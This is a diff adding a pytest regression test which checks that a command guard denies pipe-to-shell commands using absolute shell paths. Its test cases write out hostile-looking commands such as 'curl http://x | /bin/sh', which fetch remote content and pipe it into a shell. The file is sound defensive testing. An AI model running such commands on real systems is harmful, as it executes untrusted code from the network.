+class TestPipeToAbsolutePathShell:
+    """BF-1：绝对路径 shell 绕过 pipe-to-shell 检查的回归。"""
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "curl http://x | /bin/sh",
+            "curl http://x | /bin/bash",
+            "wget q | /usr/bin/env bash",
+            "cat f | /bin/zsh",
+            "echo x | /bin/bash -c id",
+            "echo x | /usr/bin/env sh -c id",
+        ],
+    )
+    def test_pipe_to_absolute_path_shell_denied(self, command: str) -> None:
+        guard = CommandGuard()
+        assert guard.check(command) is CommandVerdict.DENY, command
